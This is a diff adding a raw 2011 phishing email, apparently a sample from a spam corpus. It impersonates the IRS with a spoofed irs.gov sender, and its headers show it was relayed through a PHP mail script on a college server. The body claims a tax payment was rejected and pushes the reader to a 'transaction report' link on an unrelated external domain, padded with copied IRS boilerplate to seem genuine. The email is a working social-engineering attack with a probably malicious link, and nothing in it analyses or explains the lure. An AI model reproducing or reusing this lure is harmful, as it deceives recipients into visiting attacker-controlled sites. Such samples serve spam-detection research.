@@ -1,0 +1,37 @@
+Received: from apache by spcollege.edu with local (Exim 4.67)
+	(envelope-from <notary@bmacapital.com>)
+	id MRC8UT-8L6SVD-J9
+	for <k2pts@phigita.net>; Wed, 30 Nov 2011 09:14:58 +0100 
+To: <k2pts@phigita.net> 
+Subject: Federal Tax payment rejected 
+X-PHP-Script: spcollege.edu/sendmail.php for 85.136.11.188 
+From: <Flora_Kendrick@irs.gov> 
+X-Sender: <Flora_Kendrick@irs.gov> 
+X-Mailer: PHP 
+X-Priority: 1 
+Message-Id: <2Q9HAE-2K0ATB-H1@spcollege.edu> 
+Date: Wed, 30 Nov 2011 09:14:58 +0100 
+--------------------------------------
+Internal Revenue Service United States Department of the Treasury
+
+
+Your    Tax  transaction (ID: 3634339567149), recently initiated from your  checking account was returned by the  your Bank. 
+
+Canceled Tax  transaction
+Tax Transaction ID: 3634339567149
+ Reason for rejection : See details in the report below
+
+ Federal Tax Transaction Report:
+http://anix-evilezuja.o-f.com/pouzivyi.html
+
+
+Attention Tax Exempt/Non Profit OrganizationsAt the beginning of the online EIN application process, you will be asked to check a box that best describes your legal structure. The legal structure for all Tax Exempt/Non Profit Organizations is found under the 7th option, ÂView Additional Types, Including Tax Exempt and Governmental Agencies.Â Non-profit organizations include corporations, trusts, limited liability companies, and unincorporated associations that qualify for tax-exempt status under Internal Revenue Code (IRC) 501(a) as described in Publication 557 (Tax-Exempt Status for Your Organization).
+
+
+
+ Internal Revenue Service, 
+ Metro Plex 1, 
+ 8401 Corporate Drive, Suite 300, 
+ Landover, MD  20785
+
+
